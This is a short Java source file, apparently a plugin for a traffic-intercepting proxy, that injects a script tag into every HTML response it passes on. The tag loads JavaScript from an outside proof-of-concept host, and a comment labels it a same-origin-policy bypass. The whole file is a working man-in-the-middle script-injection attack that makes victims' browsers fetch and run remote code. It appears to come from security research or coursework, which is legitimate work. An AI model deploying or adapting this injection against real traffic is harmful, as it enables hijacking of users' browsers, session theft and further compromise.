package at.rkn2016.plugins;

import java.io.IOException;

import at.rkn2016.parser.HTTPResponse;

public class JavaScriptSameOriginPolicy extends Plugin {
	String jssource = "'http://poc.domain/todo.js'"; /* SOP bypass inject POC */

	@Override
	public void modifyHTTPresponse(HTTPResponse http_response) {
		if(http_response.fields.containsKey("Content-Type") && http_response.fields.get("Content-Type").contains("text/html"))
		{
			String inject = "<script src= " + jssource + "></script>";
			try {
				http_response.payloadPut(inject.getBytes());
			} catch (IOException e) {
				e.printStackTrace();
				System.out.println("No Java Same Origin Policy");
			}
		}

	}

}
